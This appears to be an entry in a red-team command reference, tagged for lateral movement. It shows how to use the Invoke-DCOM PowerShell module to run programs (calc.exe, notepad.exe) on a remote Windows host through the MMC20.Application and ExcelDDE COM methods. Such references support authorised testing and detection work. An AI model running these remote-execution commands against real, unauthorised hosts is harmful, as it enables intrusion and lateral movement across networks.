---
type: command
executor: powershell
data: >-
  Import-Module .\Invoke-DCOM.ps1; Invoke-DCOM -ComputerName TARGET_HOST -Method
  MMC20.Application -Command "calc.exe"; Invoke-DCOM -ComputerName TARGET_HOST
  -Method ExcelDDE -Command "calc.exe"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - dcom
verified: true
validated: true
---

# Invoke DCOM Start Calc MMC20 Excel

## Command

```powershell
Import-Module .\Invoke-DCOM.ps1
Invoke-DCOM -ComputerName TARGET_HOST -Method MMC20.Application -Command "calc.exe"
Invoke-DCOM -ComputerName TARGET_HOST -Method ExcelDDE -Command "calc.exe"
```

## Description

Uses the Invoke-DCOM PowerShell module to start calc.exe on a remote host via MMC20.Application and ExcelDDE COM methods.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ComputerName TARGET_HOST | Target IP/hostname | Yes |
| -Method MMC20.Application | COM method | Yes |
| -Command "calc.exe" | Command to run | Yes |

## Examples

### Single Method

```powershell
Invoke-DCOM -ComputerName 192.168.1.100 -Method MMC20.Application -Command "notepad.exe"
```

## Expected Output

Success message like "Command executed successfully" or error if access denied. Verify calc.exe running on target.

## Related

- [[procedures/dcom-lateral-movement]]
- [[tools/Invoke-DCOM]]
